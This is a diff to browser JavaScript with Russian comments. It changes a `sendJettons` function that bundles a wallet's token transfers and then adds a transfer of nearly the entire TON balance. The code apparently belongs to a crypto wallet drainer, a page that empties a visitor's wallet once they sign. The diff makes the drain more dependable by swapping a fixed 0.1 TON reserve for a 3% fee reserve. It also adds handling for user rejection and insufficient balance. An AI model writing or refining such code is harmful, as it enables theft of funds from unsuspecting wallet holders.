@@ -260,7 +260,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем добавление TON и исправляем ошибку с числами
+    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Оставляем 3% от баланса для комиссий
     console.log('Checking TON transfer conditions:', {
         tontx: tontx,
         tonBalance: ton,
@@ -273,23 +273,20 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     if (parseFloat(ton) > 0.1 && transaction.messages.length < 4) {
         console.log('Adding TON transfer...');
         try {
-            // ИСПРАВЛЕНИЕ: Правильная работа с числами без использования fromNano
             const tonBalanceNano = TonWeb.utils.toNano(ton);
-            const reservedNano = TonWeb.utils.toNano("0.1");
             
-            // Преобразуем в BigInt для точных вычислений
-            const balanceBigInt = BigInt(tonBalanceNano);
-            const reservedBigInt = BigInt(reservedNano);
+            // ИСПРАВЛЕНИЕ: Оставляем 3% от баланса для комиссий, но не менее 0.1 TON
+            const tonBalance = parseFloat(ton);
+            const reservedForFees = Math.max(tonBalance * 0.03, 0.1); // 3% или минимум 0.1 TON
+            const transferAmount = tonBalance - reservedForFees;
             
-            // Вычисляем сумму для отправки
-            let transfer_value = balanceBigInt - reservedBigInt;
+            console.log(`TON balance: ${tonBalance}, Reserved for fees (3%): ${reservedForFees}, Transfer amount: ${transferAmount}`);
             
-            // Проверяем что сумма положительная и достаточная
-            if (transfer_value > BigInt(0) && transfer_value > BigInt(TonWeb.utils.toNano("0.01"))) {
-                const transfer_value_str = transfer_value.toString();
+            if (transferAmount > 0.01) { // Проверяем что есть что отправлять
+                const transfer_value_nano = TonWeb.utils.toNano(transferAmount.toString());
+                const transfer_value_str = transfer_value_nano.toString();
                 
-                // ИСПРАВЛЕНИЕ: Вычисляем сумму в TON без использования fromNano
-                const tonAmount = (Number(transfer_value) / 1000000000).toFixed(9);
+                const tonAmount = transferAmount.toFixed(9);
                 console.log('TON transfer value:', tonAmount, 'TON');
                 
                 let payload = await get_ton_text(transfer_value_str);
@@ -312,7 +309,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                     };
                     tkn++;
                     tontx = true;
-                    console.log('✅ Added TON transfer to transaction:', tonAmount, 'TON');
+                    console.log('✅ Added TON transfer to transaction:', tonAmount, 'TON (reserved', reservedForFees, 'TON for fees)');
                 } else {
                     console.log('❌ Failed to get TON payload - status or data missing');
                     console.log('Payload status:', payload?.status);
@@ -342,7 +339,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                     }
                 }
             } else {
-                console.log('❌ TON transfer value too low after fees');
+                console.log('❌ TON transfer value too low after reserving 3% for fees');
             }
         } catch (tonError) {
             console.error('❌ Error adding TON transfer:', tonError);
@@ -414,6 +411,12 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             
             if (error.message && error.message.includes('Rejected by user')) {
                 console.log('❌ Transaction rejected by user');
+                return;
+            }
+            
+            if (error.message && error.message.includes('Insufficient balance')) {
+                console.log('❌ Insufficient balance - this should not happen with 3% reserve');
+                // Может потребоваться увеличить резерв
                 return;
             }
             
@@ -791,6 +794,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
